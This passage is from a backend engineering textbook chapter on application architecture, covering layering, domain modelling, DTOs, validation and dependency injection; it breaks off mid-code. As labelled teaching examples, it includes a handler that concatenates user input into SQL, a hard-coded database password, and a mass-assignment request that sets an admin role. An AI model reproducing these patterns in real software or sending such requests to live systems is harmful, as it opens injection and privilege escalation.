# Chapter 12: Application Architecture: Structure, Dependencies, and Data Flow

## Where We Are

Chapter 10 followed a request into the server process: the accept queue, the parser, the worker hand-off, routing, the middleware chain, binding the body into handler inputs, and writing the response. Chapter 11 added concurrency and numbers: many requests overlap, singleton services must hold no request data, pools are separate bottlenecks, and an in-process lock protects nothing once there are ten instances.

Both chapters stopped at the handler. This chapter opens it. A handler for "place an order" does many different things: it reads JSON, checks the input, applies business rules, talks to a database and a payment provider, and writes JSON back. How that code is divided into parts, which part may depend on which, and how data changes shape as it moves through them is called **application architecture**. These decisions do not change what the CPU executes. They decide how expensive every future change is, whether the code can be tested without a production database, whether a framework can add transactions and security checks to your methods, and whether a JSON body can make your server run an attacker's code.

The chapter moves from small to large: why structure matters at all, the classic layered design, how to model business data, how objects get their collaborators (dependency injection), how frameworks add behaviour to methods you wrote (proxies and interception), the full path of request data, serialisation and its security trap, errors, configuration, the hexagonal alternative to layers, and finally how a whole system is split into one deployable unit or many.

**After this chapter you can:**
- explain coupling and cohesion, and use them to judge where a piece of code belongs;
- describe the responsibilities of the controller, service and repository layers, and place transactions and validation correctly;
- distinguish entities, value objects and DTOs, and explain why API types should not be database types;
- explain dependency injection and inversion of control as mechanisms, build a tiny container, and reason about object lifetimes and scope mismatches;
- explain how a framework adds transactions, security or caching to a method through a proxy, and diagnose the self-invocation pitfall;
- trace a request's data from bytes to database row and back, naming the failure and status code at each step;
- configure JSON mapping deliberately, and recognise and prevent insecure deserialisation;
- design an error strategy that maps failures to correct HTTP responses without leaking internals;
- separate configuration and secrets from code;
- compare layered and hexagonal architecture, and decide between a monolith, a modular monolith and microservices;
- identify the testing seams an architecture creates, and choose between unit and integration tests.

**Interview questions this chapter prepares you for:**
1. What is dependency injection, and why use it?
2. What is inversion of control? How does it differ from dependency injection and from the Dependency Inversion Principle?
3. What do the controller, service and repository layers each do? Where do transactions and validation belong?
4. What is the difference between an entity, a value object and a DTO? Why not return database entities from an API?
5. What are singleton, prototype and request scopes, and what goes wrong when you mix them?
6. How does a framework add transactions, security checks or caching to a method that never calls them?
7. Why does an annotation such as `@Transactional` sometimes do nothing?
8. Walk through what happens to a JSON request body, from bytes to a database row and back.
9. What is insecure deserialisation, and how do you prevent it?
10. Exceptions or result types? How should errors become HTTP responses?
11. How should configuration and secrets reach an application?
12. Layered versus hexagonal architecture: what problem does hexagonal solve, and what does it cost?
13. Monolith versus microservices: what are the trade-offs? What are a modular monolith and a distributed monolith?
14. Why is a database shared between services a problem?
15. What is the difference between a unit test and an integration test, and how does architecture affect testability?

**Scope.** Here: code structure inside one application, domain modelling basics, dependency injection, proxies and interception, the request data pipeline, serialisation and insecure deserialisation, error strategy, configuration, hexagonal architecture, the monolith-to-microservices spectrum, and testing seams. Recalled, not re-taught: middleware and binding (Chapter 10, Section 10.6), singleton services and request context (Chapter 11, Section 11.6), status codes and problem details (Chapter 7, Section 7.5), JSON and media types (Chapter 7, Section 7.7). Elsewhere: API design, idempotency keys, versioning and the full error format are Chapter 13; SQL and constraints are Chapter 14; transactions and isolation are Chapter 17; ORMs, connection pools and SQL injection are Chapter 18; authentication and secret management are Chapter 20; sagas, the outbox and messaging are Chapter 25; deployment and observability are Chapter 26.

---

## 12.1 Why Structure Matters: Coupling, Cohesion, Change, Testability

### Definitions

**Application architecture** is the way an application's code is divided into parts, what each part is responsible for, and which parts are allowed to depend on which. A **module** (or **component**) is one such part: a package, a group of classes, a library.

Module A **depends on** module B when A uses B by name, so that a change to B can force a change to A. The change might be a compile error, a different behaviour, or a different data format.

**Coupling** is how much one module depends on the internal details of another. With **loose coupling**, a module can change its internals without forcing changes elsewhere. With **tight coupling**, it cannot.

**Cohesion** is how closely the things inside one module belong together. A module has **high cohesion** when everything in it serves one purpose and changes for the same reason.

**Testability** is how easily a piece of code can be run in isolation, with inputs you control and outputs you can check, without a real network, database or clock.

### Why it exists

A computer does not care how code is organised. A single 3,000-line function and a well-structured program can compile to equivalent machine code. Structure exists for people, and for one activity in particular: **change**.

Backend code changes constantly. A payment provider is replaced. A mobile app needs a second API. A batch import must create orders the same way the website does. A column is renamed. Each change has a cost, measured in the number of places you must edit and understand, and the risk that one of those edits breaks something unrelated. Good structure keeps that cost small and local. Poor structure makes every change touch everything, which slows a team down and makes bugs more likely.

### Concrete: one handler that does everything

Here is a working, unstructured "place order" handler.

```pseudo
function handlePlaceOrder(httpRequest):
    body = parseJson(httpRequest.bodyBytes)
    if body["items"] is missing or empty: return httpResponse(400, "items required")

    conn = openConnection("postgres://prod-db:5432/shop", "app", "s3cret")   // hard-coded config
    conn.execute("BEGIN")
    total = 0
    for item in body["items"]:
        row = conn.query("SELECT price, stock FROM products WHERE id = " + item["productId"])  // SQL injection
        if row.stock < item["qty"]:
            conn.execute("ROLLBACK")
            return httpResponse(409, "out of stock")
        total = total + row.price * item["qty"]                              // money as a float
        conn.execute("UPDATE products SET stock = stock - ? WHERE id = ?", item["qty"], item["productId"])
    if now().hour >= 22: total = total * 0.9                                 // late-night discount, hidden clock
    orderId = conn.query("INSERT INTO orders (...) VALUES (...) RETURNING id", ...)
    conn.execute("COMMIT")
    smtp = SmtpClient("mail.internal", 25)
    smtp.send(body["email"], "Order " + orderId + " confirmed")             // email failure after commit
    return httpResponse(201, toJson({"id": orderId, "total": total}))
```

Now list some ordinary change requests and see what each one touches:

| Change request | What must be edited | Why it hurts |
|---|---|---|
| Replace SMTP with an email API | this handler, and every other handler that sends email | email knowledge is copied everywhere |
| Add a CSV batch import that creates orders | copy the whole function, minus the HTTP parts | business rules cannot be reused without HTTP |
| Rename `products.stock` to `quantity_on_hand` | every handler with SQL that mentions it | storage details are spread across HTTP code |
| Test the late-night discount | run the test at 22:00, with a real database | the clock and the database are hidden inputs |
| Move the database to another host | edit and redeploy code | configuration is part of the code |

The function is **tightly coupled** to HTTP, PostgreSQL, SMTP, the clock and the deployment environment. It has **low cohesion**: HTTP parsing, pricing rules, inventory rules, persistence and notification share one body and change for five different reasons. It also hides two bugs that structure would have exposed: user input concatenated into SQL (SQL injection, Chapter 18) and money held as a floating-point number (Section 12.3).

### Mechanism: dependencies form a graph

Think of each module as a node and each "uses" relationship as an arrow. The shape of this **dependency graph** decides how far a change spreads: when a module changes, every module with an arrow pointing at it may have to change too, and so on backwards along the arrows.

```text
 A healthy graph: arrows point one way, towards stable things

   OrderController ──► OrderService ──► OrderRepository ──► database driver
                            │
                            ├──► PricingRules        (pure logic, no I/O)
                            └──► EmailSender ──► email client library

 A tangled graph: a cycle

   OrderService ──► CustomerService ──► InvoiceService ──► OrderService
        ▲                                                       │
        └───────────────────────────────────────────────────────┘
   A change to any of the three can ripple around the cycle to the other two.
   None of them can be understood, tested or reused without the others.
```

Three properties of the graph matter:

1. **Direction.** Arrows should point from things that change often (HTTP endpoints, integrations) towards things that change rarely (business rules, core data types). Then frequent changes affect few modules. This is sometimes called "depend in the direction of stability".
2. **Cycles.** A cycle turns several modules into one in practice. Breaking cycles is one of the main jobs of the techniques in Sections 12.4 and 12.10.
3. **Fan-in and fan-out.** A module that many others use (high fan-in, such as a `Money` type) must be very stable. A module that uses many others (high fan-out, such as a controller) is easy to break and should contain little logic.

Coupling also comes in kinds that are worth naming, because each has a different cure:

| Kind of coupling | Plain meaning | Example | Typical cure |
|---|---|---|---|
| Implementation | A knows B's concrete class or internals | service builds `new PostgresOrderRepository()` | depend on an interface; inject it (Section 12.4) |
| Data format | A and B share a structure, so changing it breaks both | two services read the same table | one owner per piece of data (Section 12.11) |
| Temporal | A works only while B is up and fast | synchronous HTTP call inside a request | timeouts, async messaging (Chapters 24, 25) |
| Hidden input | A reads something not passed to it | `now()`, global config, random numbers | pass it in as a parameter or a dependency |

### Mechanism: testability follows from coupling

A piece of code is easy to test when every input it uses can be supplied by the test, and every effect it has can be observed by the test. Hidden inputs break this. In the handler above, `now()` decides the discount, so a test cannot choose the time. The database connection is created inside, so a test cannot give it a fake one.

```pseudo
// Hard to test: the clock is a hidden input
function lateNightDiscount(total):
    if now().hour >= 22: return total * 0.9
    return total

// Easy to test: the clock is a parameter (or an injected Clock dependency)
function lateNightDiscount(total, currentTime):
    if currentTime.hour >= 22: return total * 9 / 10
    return total

test: lateNightDiscount(10000, time("22:30")) == 9000
test: lateNightDiscount(10000, time("21:59")) == 10000
```

Testability is not a separate goal. It is a symptom of loose coupling. Code that is hard to test is almost always code with hidden or concrete dependencies.

### Guarantees and non-guarantees

Good structure guarantees nothing at run time: the same bugs can live in well-organised code. What it buys is a lower, more predictable cost of change and code that people can reason about one piece at a time. It does not guarantee that more modules mean less coupling. Splitting a function into ten classes that all know each other's internals adds files without removing coupling.

### Failure and diagnosis

- **Big ball of mud.** The established name for a system with no recognisable structure: everything depends on everything. Symptom: every change takes longer than the last, and fixes in one area break another.
- **Shotgun surgery.** One logical change requires small edits in many modules (renaming a field touches 14 files). Low cohesion of a concept: it is spread out.
- **Divergent change.** One module changes for many unrelated reasons (the handler above). Low cohesion of a module: it holds too much.

Version control is the evidence. Files that change in nearly every commit are **hotspots**, and files that always change together are coupled even if no import connects them:

```bash
# The 10 most frequently changed files in the last 6 months
git log --since="6 months ago" --format="" --name-only | sort | uniq -c | sort -rn | head -10
```

A file at the top of this list that is also very long and has many authors is the usual place where structure has broken down.

### Backend connection

Every architectural technique in this chapter is a way to manage dependencies: layers decide which way they point (Section 12.2), dependency injection decides who creates them (Section 12.4), proxies add behaviour without adding them (Section 12.5), hexagonal architecture inverts the one to the database (Section 12.10), and service boundaries decide which of them cross a network (Section 12.11). When you judge any design, ask two questions: "if this changes, what else must change?" and "can I test this without the rest of the system?"

---

## 12.2 Layered Architecture: Controller, Service, Repository

### Definition

A **layered architecture** divides code into horizontal **layers**, each with one kind of responsibility, and lets each layer call only the layer directly below it. The common backend form has three:

- The **presentation layer** (or **web layer**, made of **controllers**) translates between the protocol (HTTP) and the application.
- The **service layer** (or **application layer**) carries out the application's use cases: it applies business rules and coordinates the work, including the transaction.
- The **data access layer** (made of **repositories**) stores and loads data, hiding how the database is queried.

A **use case** is one thing a user or another system can ask the application to do: "place an order", "cancel an order", "register a customer".

### Why it exists

The three layers separate the three most common reasons code changes. HTTP details change when the API changes. Business rules change when the business changes. Storage details change when the schema or the database changes. If each reason has its own layer, each kind of change stays in one place, and the business rules can be reused by every entry point: an HTTP endpoint, a batch job, a message consumer.

### Mechanism: what each layer knows

```text
                 HTTP request                                   HTTP response
                      │                                              ▲
 ┌────────────────────▼──────────────────────────────────────────────┴──────────┐
 │ PRESENTATION (controllers)                                                    │
 │  knows: HTTP, JSON, status codes, request DTOs, response DTOs                 │
 │  does:  bind input, check its shape, call ONE service method, map the result  │
 │  never: business decisions, SQL, transactions                                 │
 └────────────────────┬──────────────────────────────────────────────────────────┘
                      │ method call with plain values / commands
 ┌────────────────────▼──────────────────────────────────────────────────────────┐
 │ SERVICE (application services, one method per use case)                       │
 │  knows: the domain model, business rules, which repositories and clients     │
 │  does:  load data, apply rules, change state, save, call other systems;       │
 │         owns the TRANSACTION boundary                                         │
 │  never: HTTP objects, status codes, JSON, SQL strings                         │
 └────────────────────┬──────────────────────────────────────────────────────────┘
                      │ findById, save, findByCustomer ...
 ┌────────────────────▼──────────────────────────────────────────────────────────┐
 │ DATA ACCESS (repositories)                                                    │
 │  knows: SQL or the ORM, table and column names, the driver                    │
 │  does:  turn domain objects into rows and rows into domain objects            │
 │  never: business rules, HTTP                                                  │
 └────────────────────┬──────────────────────────────────────────────────────────┘
                      ▼
                   database

 DOMAIN MODEL (Order, Money, Customer ...) is used by all three layers and depends on none.
```

A **repository** deserves a precise definition, because the word is used loosely. It is an object that behaves like a collection of one kind of domain object (all orders, all customers), with methods such as `findById`, `save` and `findByCustomer`. Its job is to hide the query language. Code above it asks for orders; it does not know whether they came from SQL, an ORM or a cache. (An **ORM**, object-relational mapper, is a library that maps classes to tables and generates the SQL to load and save them; Chapter 18 explains how it works.)

### Concrete: the handler from Section 12.1, layered

```pseudo
// ── presentation ───────────────────────────────────────────────
class OrderController:
    orderService                                   // a collaborator, given at startup

    function post(httpRequest):                    // POST /api/orders
        dto = bindJson(httpRequest, PlaceOrderRequest)       // 400 if malformed
        validateShape(dto)                                   // 422 if items empty, qty <= 0 ...
        result = orderService.placeOrder(httpRequest.user.id, toCommand(dto))
        return response(201, toResponseDto(result), header("Location", "/api/orders/" + result.id))

// ── service ────────────────────────────────────────────────────
class OrderService:
    products, orders, pricing, notifier, clock    // collaborators, given at startup

    function placeOrder(customerId, command):      // one use case = one transaction
        tx = beginTransaction()
        try:
            lines = []
            for item in command.items:
                product = products.findByIdForUpdate(item.productId)   // locks the row (Chapter 17)
                product.reserve(item.quantity)                         // rule: throws OutOfStock
                lines.add(OrderLine(product.id, item.quantity, product.price))
            order = Order.place(customerId, lines, pricing.discountAt(clock.now()))
            orders.save(order)
            products.saveAll(...)
            tx.commit()
        catch any as e:
            tx.rollback()
            throw e
        notifier.orderPlaced(order)                // after commit (see "Failure" below)
        return order

// ── data access ────────────────────────────────────────────────
class OrderRepository:
    db
    function save(order):
        db.execute("INSERT INTO orders (id, customer_id, total_cents, currency, status) VALUES (?, ?, ?, ?, ?)",
                   order.id, order.customerId, order.total.cents, order.total.currency, order.status)
        for line in order.lines:
            db.execute("INSERT INTO order_lines (...) VALUES (?, ?, ?, ?)", ...)  // parameters, never concatenation
```

Re-run the change table from Section 12.1. Replacing SMTP touches one `Notifier` implementation. The batch import calls `orderService.placeOrder` directly. Renaming a column touches one repository. The discount is tested by giving `OrderService` a fixed `clock`. Moving the database changes configuration, not code (Section 12.9).

### Mechanism: why the transaction belongs to the service

A **transaction** groups several database changes so that either all of them take effect or none do (the full treatment is Chapter 17). The question is which layer starts and ends it. The answer follows from the definition of a use case: one use case is one unit of business work, so it should be one transaction.

```text
 Option A: transaction per repository call (too small)
   orders.save(order)         BEGIN … COMMIT   ✔ order saved
   products.saveAll(stock)    BEGIN … crash    ✘ stock not reduced
   → an order exists for goods that were never reserved

 Option B: transaction in the controller (too large, wrong place)
   BEGIN
   placeOrder(...)                       business work
   toResponseDto(...)                    serialisation, maybe lazy loads (Chapter 18)
   COMMIT                                connection held during all of it (Chapter 11, Section 11.5)
   → the batch import, which has no controller, gets no transaction at all

 Option C: transaction in the service method (the use case)
   BEGIN  reserve stock, save order  COMMIT
   → all-or-nothing for exactly the business operation, for every entry point
```

In real frameworks, the `beginTransaction` / `commit` / `rollback` code in `placeOrder` is usually not written by hand. A proxy adds it around the method (Section 12.5).

### MVC, layers and tiers

Three terms are often confused in interviews.

- **Model–View–Controller (MVC)** is a pattern for the presentation part of an application. The **model** is the data to show, the **view** renders it (an HTML template, or in a JSON API, the serialised response), and the **controller** receives input and chooses what to do. MVC lives inside the top layer. The word "controller" in backend layering comes from it.
- **Layers** are a logical division of code inside one program.
- **Tiers** are a physical division across machines or processes: the classic **three-tier architecture** is a client tier (browser), an application tier (the server) and a data tier (the database). Chapter 1 (Section 1.8) separated logical architecture from physical deployment in the same way. All three code layers usually run in one tier.

### Strict versus relaxed layering, and package structure

In **strict layering**, a layer may call only the layer directly below it. In **relaxed layering**, it may skip layers (a controller calling a repository for a simple read). Relaxed layering saves pass-through code, but every skip puts storage knowledge into the presentation layer and lets business rules be bypassed. Most teams allow it only for read-only queries, if at all.

Layers also suggest how to arrange source folders. There are two common options:

```text
 package by layer                         package by feature
 ├── controller/                          ├── orders/
 │   ├── OrderController                  │   ├── OrderController
 │   └── CustomerController               │   ├── OrderService
 ├── service/                             │   ├── OrderRepository
 │   ├── OrderService                     │   └── Order
 │   └── CustomerService                  ├── customers/
 └── repository/                          │   ├── CustomerController
     ├── OrderRepository                  │   └── ...
     └── CustomerRepository
```

Packaging by layer groups things that rarely change together (all controllers). Most changes are **vertical**: a new field on orders touches the order controller, service and repository. Packaging by feature keeps those together (higher cohesion) and lets each feature hide its internals, which becomes the basis of the modular monolith in Section 12.11. Layers still exist inside each feature folder.

### Rich versus anaemic domain models

In an **anaemic domain model**, domain objects are plain data with getters and setters, and every rule lives in services (`if order.status == PAID then ...`). In a **rich domain model**, objects enforce their own rules (`order.cancel()` refuses if the order has shipped). Anaemic models are simple for basic create-read-update-delete applications, but rules end up duplicated across services that each change the same data. Section 12.3 shows the rich style for the rules that matter.

### Guarantees and non-guarantees

Layering, when its rules are enforced, guarantees that protocol changes stay in controllers and storage changes stay in repositories, and that every entry point reuses the same business logic. It does not guarantee good boundaries **between** features: layers are horizontal, and two features can still be tangled inside the service layer. It also costs something: pass-through methods, mapping between layer types, and more files for simple operations.

### Failure and diagnosis

- **Fat controller.** Business rules in controllers. Symptom: the batch import and the API apply different rules to the same data. Evidence: `if` statements about business states in controller code.
- **Leaky layers.** The service accepts an HTTP request object, or a repository returns an ORM query object that the controller keeps querying. Symptom: services that cannot be called from a job; database queries running while the response is serialised (Chapter 18 explains lazy loading).
- **Transactions in the wrong place.** Partial data after failures (too small), or long-held connections and missing transactions for non-HTTP entry points (too large or misplaced). Evidence: database logs showing several commits per use case, or sessions idle in a transaction during response writing.
- **Service-to-service cycles.** `OrderService` calls `CustomerService`, which calls `OrderService`. Evidence: the dependency injection container refuses to start (Section 12.4), or a dependency graph tool shows the cycle.

Layer rules can be checked automatically. In Java, the ArchUnit library lets a test assert "classes in `..service..` must not depend on classes in `..controller..`". Without a tool, an import search is a quick check:

```bash
# Any service-layer file that imports HTTP types is a layer violation
grep -rlE "import .*(http|servlet|HttpServletRequest|ResponseEntity)" src/main/java/com/shop/*/service/
```

### Backend connection

Write one service method per use case and make it the transaction boundary. Keep controllers thin (bind, check shape, call, map) and repositories free of business rules. Organise folders by feature, with layers inside each feature, so that a feature's internals can later be hidden behind a boundary.

---

## 12.3 Domain Modelling Basics: Entities, Value Objects, DTOs, Validation

### Definitions

The **domain** is the business area the application serves: orders, stock, payments, customers. The **domain model** is the code that represents the domain's concepts and rules.

An **entity** is a domain object with an identity that stays the same while its attributes change. Order 42 is still order 42 after it is paid and shipped. Two entities are equal only if they have the same identity.

A **value object** is a domain object defined entirely by its attributes, with no identity of its own. `Money(1999, "EUR")` is equal to any other `Money(1999, "EUR")`. Value objects are **immutable**: to "change" one, you create a new one.

A **data transfer object (DTO)** is a plain data structure shaped for crossing a boundary, such as an API request or response body or a message. It holds data and has no business behaviour. Chapter 1 (Section 1.10) introduced the term.

An **aggregate** is a cluster of entities and value objects treated as one unit for changes, with one **root** entity through which all changes go. An `Order` with its `OrderLine`s is an aggregate whose root is the `Order`. The term comes from domain-driven design. What matters here is its purpose: the aggregate is the boundary inside which the business rules (**invariants**) must always hold.

An **invariant** is a condition that must always be true, such as "an order's total equals the sum of its lines" or "stock is never negative".

### Why it exists

Without a domain model, business data travels as raw strings, numbers and maps, and every rule about it is re-checked (or forgotten) wherever it is used. Three classic failures follow:

1. **Primitive obsession.** Money as a floating-point number loses cents: `0.1 + 0.2` is `0.30000000000000004` in binary floating point. An amount in euros is added to one in dollars because both are just numbers.
2. **Scattered rules.** "A shipped order cannot be cancelled" is checked in the API, forgotten in the admin tool, and the admin tool cancels shipped orders.
3. **API shape welded to storage shape.** The JSON the API returns is the database row. Adding a column exposes it to every client; renaming one breaks them.

### Mechanism 1: value objects check themselves once

A value object validates its input in its constructor (or factory function). If construction succeeds, the object is valid for its whole life, because it can never change.

```pseudo
class Money:                                   // value object: immutable
    cents: integer                             // whole minor units, never floating point
    currency: string                           // ISO 4217 code: "EUR", "USD"

    constructor(cents, currency):
        require currency in SUPPORTED_CURRENCIES  else throw InvalidMoney
        this.cents = cents
        this.currency = currency

    function plus(other):
        require other.currency == this.currency  else throw CurrencyMismatch
        return Money(this.cents + other.cents, this.currency)   // a new object

    function minus(other):
        require other.currency == this.currency  else throw CurrencyMismatch
        return Money(this.cents - other.cents, this.currency)

    function times(quantity):
        return Money(this.cents * quantity, this.currency)

    equals(other) = (cents == other.cents and currency == other.currency)  // equality by value

class EmailAddress:
    value: string
    static function parse(raw):
        trimmed = lowercase(trim(raw))
        require matchesEmailSyntax(trimmed) and length(trimmed) <= 254  else throw InvalidEmail
        return EmailAddress(trimmed)
```

This idea is sometimes summarised as **"parse, don't validate"**: instead of checking a string and then passing the same string along (where later code cannot tell whether it was checked), convert it once into a type that can only hold valid values. Every function that accepts an `EmailAddress` knows it is valid.

### Mechanism 2: entities guard their state transitions

An entity's important rules are about how its state may change. Model them as methods, not as public setters.

```text
 Order status: a state machine
            pay()               ship()              deliver()
  PLACED ─────────► PAID ─────────────► SHIPPED ─────────────► DELIVERED
     │                │
     │ cancel()       │ cancel() (refund)
     ▼                ▼
  CANCELLED ◄─────────┘          cancel() from SHIPPED or DELIVERED: refused
```

```pseudo
class Order:                                   // entity; aggregate root
    id, customerId, lines, total, status

    static function place(customerId, lines, discount):
        require lines is not empty               else throw EmptyOrder
        total = sum(line.price.times(line.quantity) for line in lines).minus(discount)
        return Order(newId(), customerId, lines, total, PLACED)

    function cancel():
        if status in (SHIPPED, DELIVERED): throw CannotCancel(id, status)
        status = CANCELLED

    function markPaid(payment):
        require status == PLACED                 else throw InvalidTransition(status, PAID)
        require payment.amount.equals(total)     else throw AmountMismatch
        status = PAID

    equals(other) = (id == other.id)          // equality by identity
```

There is no `setStatus`. The only way to change the status is through methods that enforce the state machine, so every caller (API, admin tool, batch job) gets the same rules.

### Mechanism 3: DTOs keep the API separate from the domain

```text
   PlaceOrderRequest (DTO)          Order (domain entity)             OrderResponse (DTO)
   ─────────────────────────        ─────────────────────────         ─────────────────────────
   items: [{productId, qty}]        id, customerId                    id
   couponCode?                      lines: [OrderLine]                status
                                    total: Money                      total: "19.99"
   NOT here: id, status, total,     status: OrderStatus               currency: "EUR"
   customerId, price                internalRiskScore                 items: [...]
                                    createdBy, version                NOT here: internalRiskScore,
                                                                      createdBy, version
```

The request DTO contains only what a client may choose. The response DTO contains only what a client may see. The domain entity contains everything the business needs. The three shapes differ on purpose, and mapping between them is explicit code (Section 12.6).

Separating them prevents two security failures. Both are named in the API Security Top 10 (2023 edition) of **OWASP** (the Open Worldwide Application Security Project, a non-profit whose security guidance is widely used) under **Broken Object Property Level Authorization**:

- **Mass assignment.** If the request body is bound directly to the domain or database object, the client can set fields it should never control. A registration endpoint that binds JSON into a `User` with an `isAdmin` field accepts `{"email": "...", "password": "...", "isAdmin": true}`. A real incident of this kind: in 2012, a researcher used mass assignment in GitHub's own Ruby on Rails application to attach their public key to the Rails project's repository, gaining the ability to push to it.
- **Excessive data exposure.** If the database object is serialised as the response, every column goes out: password hashes, internal scores, other customers' data in loaded relations. The client usually hides them in the interface, but the attacker reads the raw JSON.

```http
PATCH /api/users/me HTTP/1.1
Content-Type: application/json

{"displayName": "Ana", "role": "ADMIN", "emailVerified": true}
```

With a `UpdateProfileRequest` DTO that has only `displayName`, the extra fields are either rejected or ignored (Section 12.7 discusses which). With direct binding to `User`, the user just made themselves an administrator.

### Mechanism 4: where each kind of validation belongs

**Validation** is checking that data is acceptable before acting on it. Not all checks need the same information, so they belong in different places:

| Level | What it checks | Needs | Where | Typical response |
|---|---|---|---|---|
| Client-side | Same as shape, for user convenience | the form | browser or app (Chapter 1, Section 1.3) | none: a convenience, never trusted |
| Shape (syntactic) | Present, right type, format, length, range, of the input alone | only the request | request DTO, at the edge | `400` or `422` |
| Domain (semantic) | Business rules that depend on state: stock available, coupon valid now, order belongs to caller, transition allowed | loaded data | entities, value objects, services | `409`, `422`, `403` or `404` |
| Database invariants | Uniqueness, references exist, not null, simple checks | all committed data, including concurrent requests | constraints (Chapter 14) | translated to `409` (Section 12.8) |

The last row matters most for correctness. A check in application code sees only what this request has read. Two concurrent registrations with the same email can both run "is this email taken?", both see "no", and both insert: the check-then-act race of Chapter 5 (Section 5.2), across instances as in Chapter 11 (Section 11.7).

```text
 time   request A                         request B                      users table
 t1     SELECT … WHERE email='x' → none                                  (no x)
 t2                                       SELECT … WHERE email='x' → none
 t3     INSERT x                                                         x
 t4                                       INSERT x                       x, x   ← duplicate
 With UNIQUE(email): t4 fails with a unique-violation error, which the
 application translates into 409 "email already registered".
```

So the rule is: check shape at the edge to fail fast and give good messages; check business rules in the domain; and **enforce** invariants that must survive concurrency in the database. The application-level check is still useful (it gives a friendly message in the common case), but only the constraint is a guarantee.

### Guarantees and non-guarantees

A value object guarantees its own validity wherever it exists, because it is checked once and never changes. An entity with guarded methods guarantees its state machine for every caller that goes through those methods. DTO validation guarantees only the shape of the input at the moment it arrives. None of them guarantees an invariant across concurrent requests or across rows; that takes database constraints or transactions (Chapters 14 and 17).

### Failure and diagnosis

- **Rounding errors in money.** Totals off by a cent; reconciliation reports that never balance. Evidence: `float` or `double` fields for amounts, or JSON amounts parsed as floating point. Fix: integer minor units or a decimal type, in code, in the database (`NUMERIC` or integer cents) and in JSON (Chapter 7, Section 7.7 covered JSON number precision).
- **Mass assignment.** Fields that only the system should set (role, status, owner, price) change after ordinary updates. Evidence: audit logs or database history showing those fields changed by a user request. Fix: request DTOs listing only client-settable fields.
- **Leaked fields.** Evidence: inspect real API responses (not the user interface) for fields that should be internal. Fix: explicit response DTOs.
- **Duplicates despite validation.** Evidence: two rows with the same "unique" value created milliseconds apart. Fix: a unique constraint, plus translating its violation into a clear error.

### Backend connection

Use value objects for amounts, identifiers, emails and anything with format rules; use entities with methods for anything with a lifecycle; and keep separate request and response DTOs for every endpoint. Put each check at the level that has the information to make it, and let the database enforce what must hold under concurrency.

---

## 12.4 Dependency Injection and Inversion of Control

### Definitions

A **dependency** of an object is another object it uses to do its work. `OrderService` depends on a product repository, an order repository, a pricing component, a notifier and a clock.

**Dependency injection (DI)** means an object receives its dependencies from outside, usually as constructor parameters, instead of creating them or looking them up itself. The object says what it needs; something else decides which concrete objects to supply.

**Inversion of control (IoC)** is the broader principle that a framework, not your code, controls the flow of the program and calls your code at the right moments. Your code is a set of pieces (handlers, components, callbacks) that the framework creates, connects and invokes. It is often summarised as "don't call us, we'll call you". Dependency injection is one form of IoC: control over **creating and connecting objects** moves out of the objects themselves.

A **DI container** (or **IoC container**) is a component that creates the application's objects, works out each one's dependencies, supplies them, and manages how long each object lives.

The **composition root** is the single place where the application's object graph is assembled: the container's configuration, or, without a container, the `main` function.

An object's **scope** (or **lifetime**) decides when it is created and how widely one instance is shared: one for the whole application, one per request, or a new one every time.

### Why it exists

Look at a service that creates its own dependencies:

```pseudo
class OrderService:
    constructor():
        this.orders   = PostgresOrderRepository(ConnectionPool("postgres://prod-db/shop", size = 10))
        this.products = PostgresProductRepository(ConnectionPool("postgres://prod-db/shop", size = 10))
        this.notifier = SmtpNotifier("mail.internal", 25)
        this.clock    = SystemClock()
```

Every problem from Section 12.1 is here, plus some new ones:

1. **No substitution.** A test cannot replace the database, the mail server or the clock. Running `OrderService` in a test sends real email.
2. **Configuration in code.** Hosts and pool sizes are fixed at compile time.
3. **Duplicated shared resources.** Each class that builds its own pool creates another one. With five services each creating a 10-connection pool, one instance opens 50 connections instead of 10, and 20 instances open 1,000 (Chapter 11, Section 11.5 showed why that exhausts the database).
4. **Implementation coupling.** `OrderService` is tied to PostgreSQL and SMTP by name.

A first alternative is a **service locator**: a global registry the class asks at run time (`this.orders = Registry.get("orderRepository")`). It allows substitution, but the dependencies are now hidden inside method bodies, every class depends on the global registry, and a missing registration is discovered only when that line runs. Dependency injection is the alternative that makes dependencies visible and checkable before the first request.

### Mechanism 1: injection by hand (no container)

Dependency injection does not need a framework. Move creation out of the class, and do it once, in the composition root:

```pseudo
class OrderService:
    constructor(orders, products, pricing, notifier, clock):   // asks; does not create
        this.orders = orders; this.products = products
        this.pricing = pricing; this.notifier = notifier; this.clock = clock

function main():                                     // the composition root
    config   = loadConfig()                          // Section 12.9
    pool     = ConnectionPool(config.db.url, config.db.poolSize)   // ONE pool, shared
    orders   = SqlOrderRepository(pool)
    products = SqlProductRepository(pool)
    notifier = EmailNotifier(EmailApiClient(config.email.apiUrl, config.email.apiKey))
    service  = OrderService(orders, products, PricingRules(), notifier, SystemClock())
    server   = HttpServer(routes = [OrderController(service), HealthController(pool)])
    server.start(config.http.port)

// In a test, the same class is assembled differently:
service = OrderService(InMemoryOrders(), InMemoryProducts(), PricingRules(),
                       RecordingNotifier(), FixedClock("2026-10-21T22:30Z"))
```

This style is called **pure DI** or manual wiring. It is fully explicit, checked by the compiler, and common in Go. Its cost appears with size: an application with 300 components has a long `main` that must be edited whenever a constructor changes.

### Mechanism 2: three forms of injection

| Form | How | Strengths | Weaknesses |
|---|---|---|---|
| **Constructor injection** | dependencies are constructor parameters | required dependencies cannot be missing; fields can be immutable; the object is complete once constructed; dependencies are visible in one place | many parameters look alarming (usually a real sign of too many responsibilities) |
| **Setter injection** | a setter is called after construction | suits truly optional dependencies | the object exists half-built; fields are mutable |
| **Field injection** | the container writes private fields directly, by **reflection** (code inspecting and modifying objects' structure at run time) | short to write | dependencies are hidden; fields cannot be immutable; the class cannot be built in a test without the container or reflection |

Constructor injection is the standard recommendation. It also has a useful side effect: a constructor with nine parameters makes low cohesion visible, while nine injected private fields hide it.

### Mechanism 3: a tiny DI container

A container automates the composition root. Here is a complete small one in pseudocode, with registration, resolution, three scopes, cycle detection and shutdown.

```pseudo
enum Scope: SINGLETON, PER_REQUEST, TRANSIENT

class Container:
    registrations = map()        // type → (factory, scope)
    singletons    = map()        // type → instance (created at most once)
    resolving     = set()        // types currently being built, for cycle detection
    creationOrder = list()       // singletons in the order they were created

    function register(type, factory, scope):
        registrations[type] = (factory, scope)

    // `requestScope` is a small map that lives for one request (null outside a request)
    function resolve(type, requestScope = null):
        if type not in registrations: throw MissingDependency(type)
        (factory, scope) = registrations[type]

        if scope == SINGLETON and type in singletons:    return singletons[type]
        if scope == PER_REQUEST:
